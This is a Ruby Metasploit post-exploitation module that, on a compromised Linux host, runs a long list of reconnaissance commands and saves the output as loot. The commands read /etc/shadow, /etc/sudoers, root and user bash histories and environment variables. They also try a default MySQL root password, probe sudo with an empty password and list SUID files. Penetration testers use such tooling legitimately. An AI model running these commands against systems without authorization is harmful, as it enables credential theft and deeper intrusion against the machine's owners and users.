##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Gather System Information',
      'Description'   => %q{
        This module gathers system information. We collect
        installed packages, installed services, mount information,
        user list, user bash history and cron jobs, files, and so on.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Nixawk'
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))
  end

  def run
    distro = get_sysinfo
    store_loot(
      "linux.version",
      "text/plain",
      session,
      "Distro: #{distro[:distro]},Version: #{distro[:version]}, Kernel: #{distro[:kernel]}",
      "linux_info.txt",
      "Linux Version")

    # Operating Syetem
    print_good("Operating Syetem:")
    print_good("\t#{distro[:version]}")
    print_good("\t#{distro[:kernel]}")

    # Application & Services
    installed_pkg = get_packages(distro[:distro])
    installed_svc = get_services(distro[:distro])

    # File Systems / no (cat_file / read_file)
    commands = [
      ## system
      "/bin/hostname 2>/dev/null",
      "/bin/uname -a 2>/dev/null",
      "/bin/cat /etc/*-release 2>/dev/null",

      # Communications & Networking
      "/sbin/ifconfig -a 2>/dev/null",
      "/bin/netstat -antp 2>/dev/null",
      "/bin/netstat -anup 2>/dev/null",
      "/bin/cat /etc/resolv.conf 2>/dev/null",
      "/sbin/route -e",
      "/sbin/iptables -L",
      "/sbin/iptables -L -t nat",
      "/sbin/iptables -L -t mangle",
      "/bin/cat /etc/hosts",
      "/usr/bin/lsof -nPi",
      "/sbin/iwconfig",
      "/bin/ls -R /etc/network",
      "/sbin/route 2>/dev/null",
      "/bin/cat /etc/inetd.conf 2>/dev/null",
      "/bin/cat /etc/xinetd.conf 2>/dev/null",
      "/bin/ls -la /etc/init.d 2>/dev/null",

      # Confidential Information & Users
      "/usr/bin/id 2>/dev/null",
      "/usr/bin/lastlog | /bin/grep -v \"Never\" 2>/dev/null",
      "/bin/cat /etc/passwd 2>/dev/null",
      "/bin/cat /etc/shadow 2>/dev/null",
      "/bin/cat /etc/master.passwd 2>/dev/null",
      "/bin/cat /etc/sudoers 2>/dev/null",
      "sudo -V 2>/dev/null",
      "echo '' | sudo -S -l 2>/dev/null",

      # /* Processes */
      "ps aux 2>/dev/null",

      # /* USER/GROUP */
      "/usr/bin/whoami 2>/dev/null",

      ## FILES AND DIRECTORIES
      "/bin/ls -ahl /root/ 2>/dev/null",
      "/bin/ls -ahl /home/ 2>/dev/null",
      "/bin/ls -ahl /etc/ 2>/dev/null",
      "/bin/ls -ahl /opt/ 2>/dev/null",
      "/bin/ls -ahl /var/ 2>/dev/null",
      "/bin/ls -ahl /tmp/ 2>/dev/null",
      "/bin/ls -ahl $HOME 2>/dev/null",
      "/bin/cat /etc/ssh/sshd_config 2>/dev/null",

      # /* ENVIRONMENTAL */
      "/bin/cat /etc/issue 2>/dev/null",
      "/bin/echo $PATH 2>/dev/null",
      "/bin/cat /etc/shells 2>/dev/null",
      "umask -S 2>/dev/null & umask 2>/dev/null",
      "/bin/cat /etc/login.defs 2>/dev/null",
      "/bin/cat ~/.bash_history 2>/dev/null",
      "/bin/cat /root/.bash_history 2>/dev/null",
      "/usr/bin/env 2>/dev/null",
      "/bin/ls -la /var/log/ 2>/dev/null",
      "/bin/cat /etc/shells 2>/dev/null",
      "/bin/cat /etc/login.defs 2>/dev/null",

      # /* JOBS/TASKS */
      "/bin/ls -la /etc/cron* 2>/dev/null",
      "/bin/cat /etc/crontab 2>/dev/null",
      "/bin/ls -la /var/spool/cron/crontabs 2>/dev/null",
      "/bin/ls -la /etc/anacrontab 2>/dev/null; /bin/cat /etc/anacrontab 2>/dev/null",
      "/bin/ls -la /var/spool/anacron 2>/dev/null",

      # /* SOFTWARE */
      "mysql --version 2>/dev/null",
      "mysqladmin -uroot -proot version 2>/dev/null",
      "mysqladmin -uroot version 2>/dev/null",
      "psql -V 2>/dev/null",
      "redis-cli --vrsion 2>/dev/null",
      "mongo --vrsion 2>/dev/null",
      "apache2 -v 2>/dev/null; httpd -v 2>/dev/null",
      "/bin/cat /etc/apache2/envvars 2>/dev/null",

      # /* INTERESTING FILES */
      "/bin/mount -l",
      "/bin/df -ahT",
      "find /var/log -type f -perm -4 2> /dev/null",
      "find / -xdev -type f -perm +6000 -perm -1 2> /dev/null"
    ]

    commands.each do |command|
      result = ''
      output = execute(command)
      data = "enum-linux $ #{command}" + output
      result << data if output
      save(command, result) if result
    end

    save("Installed Packages", installed_pkg)
    save("Installed Services", installed_svc)

  end

  def execute(cmd)
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd)
    output
  end

  def save(msg, data, ctype = 'text/plain')
    ltype = "linux.enum.system"
    loot = store_loot(ltype, ctype, session, data, nil, msg)
    print_status("#{msg} stored in #{loot}")
  end

  def get_packages(distro)
    packages_installed = ""
    case distro
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      packages_installed = execute("rpm -qa")
    when /slackware/
      packages_installed = execute("/bin/ls /var/log/packages")
    when /ubuntu|debian/
      packages_installed = execute("/usr/bin/dpkg -l")
    when /gentoo/
      packages_installed = execute("equery list")
    when /arch/
      packages_installed = execute("/usr/bin/pacman -Q")
    else
      print_error("Could not determine package manager to get list of installed packages")
    end
    packages_installed
  end

  def get_services(distro)
    services_installed = ""
    case distro
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      services_installed = execute("/sbin/chkconfig --list")
    when /slackware/
      services_installed << "\nEnabled:\n*************************\n"
      services_installed << execute("ls -F /etc/rc.d | /bin/grep \'*$\'")
      services_installed << "\n\nDisabled:\n*************************\n"
      services_installed << execute("ls -F /etc/rc.d | /bin/grep \'[a-z0-9A-z]$\'")
    when /ubuntu|debian/
      services_installed = execute("/usr/sbin/service --status-all")
    when /gentoo/
      services_installed = execute("/bin/rc-status --all")
    when /arch/
      services_installed = execute("/bin/egrep '^DAEMONS' /etc/rc.conf")
    else
      print_error("Could not determine the Linux Distribution to get list of configured services")
    end
    services_installed
  end
end
